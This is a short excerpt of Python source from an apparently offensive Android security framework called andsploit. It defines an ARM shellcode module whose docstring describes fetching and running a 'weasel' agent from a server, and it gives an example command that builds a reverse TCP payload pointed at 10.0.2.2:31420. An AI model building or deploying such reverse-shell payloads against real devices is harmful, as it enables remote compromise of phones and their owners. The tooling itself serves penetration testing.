...
class ARMEABI(Module, common.ShellCode):
    ...
    This module connects to the andsploit Server, and sends 0x57 (W) to request
    weasel. The andsploit Server will attempt to transfer and run weasel, establishing
    ...
    """
    examples = """
    $ andsploit payload build weasel.reverse_tcp.armeabi --server 10.0.2.2:31420
                                                      --format U
    """
